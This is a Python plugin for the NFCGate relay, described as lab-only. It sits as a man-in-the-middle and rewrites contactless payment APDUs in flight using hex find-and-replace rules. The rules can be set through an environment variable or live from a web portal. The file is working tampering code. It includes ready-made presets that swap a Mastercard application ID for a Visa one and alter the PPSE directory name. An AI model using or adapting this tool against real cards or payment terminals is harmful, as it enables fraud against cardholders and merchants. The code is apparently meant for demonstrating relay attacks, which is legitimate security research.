"""mod_modify — lab-only on-the-fly APDU rewriter for the NFCGate relay.

Rewrites relayed APDUs in flight (protocol-correct, via protobuf), to show that
a relay MITM can not only observe but ALTER a transaction. Inspired by
penegui/MITM-PixNFC's mod_pixpatch.

Rules can be set at startup via env or LIVE from the web portal:

    NFCGATE_PATCH_RULES="<find_hex>=<replace_hex>[,<find_hex>=<replace_hex>...]"

Each rule replaces the FIRST occurrence of find_hex with replace_hex inside the
relayed APDU (same length recommended). With no rules the plugin is a transparent
passthrough. Every rewrite is logged ([PATCH] old -> new). Lab / test cards only.
"""
import os

from plugins import c2c_pb2, c2s_pb2

# Ready-made demo scenarios the web portal can one-click.
PRESETS = {
    "mc_to_visa": "a0000000041010=a0000000031010",   # SELECT AID Mastercard -> Visa
    "ppse_tag": "325041592e5359532e4444463031=325041592e5359532e4444463032",  # PPSE DDF01 -> DDF02
}


def _parse_rules(spec):
    rules = []
    for part in (spec or "").split(","):
        part = part.strip()
        if not part or "=" not in part:
            continue
        find_s, repl_s = part.split("=", 1)
        try:
            fb = bytes.fromhex(find_s.strip())
            rb = bytes.fromhex(repl_s.strip())
        except ValueError:
            continue
        if fb:
            rules.append((fb, rb))
    return rules


_rules = _parse_rules(os.environ.get("NFCGATE_PATCH_RULES", ""))


def configure(cfg):
    """Called by the web portal / control API to set rules at runtime."""
    global _rules
    _rules = _parse_rules(cfg.get("rules", ""))


def describe():
    return {
        "title": "APDU rewrite (MITM)",
        "danger": True,
        "active": bool(_rules),
        "fields": [{"key": "rules", "label": "Rules (find=replace hex, comma-separated)",
                    "type": "text", "value": ",".join(f"{a.hex()}={b.hex()}" for a, b in _rules)}],
        "presets": PRESETS,
    }


async def handle_data(log, data, state):
    if not _rules:
        return data
    try:
        sd = c2s_pb2.ServerData()
        sd.ParseFromString(data)
        if not sd.data:
            return data
        nfc = c2c_pb2.NFCData()
        nfc.ParseFromString(sd.data)
        apdu = bytes(nfc.data)
        patched = apdu
        for fb, rb in _rules:
            if fb in patched:
                patched = patched.replace(fb, rb, 1)
                if len(rb) != len(fb):
                    log(f"[PATCH] length change {len(fb)}->{len(rb)} bytes may break APDU framing",
                        level="WARNING")
        if patched == apdu:
            return data
        src = "CARD" if nfc.data_source == c2c_pb2.NFCData.CARD else "READER"
        log(f"[PATCH] {src} APDU rewritten: {apdu.hex()} -> {patched.hex()}", level="WARNING")
        nfc.data = patched
        sd.data = nfc.SerializeToString()
        return sd.SerializeToString()
    except Exception as e:
        log(f"[PATCH] error, passing through: {e}", level="ERROR")
        return data
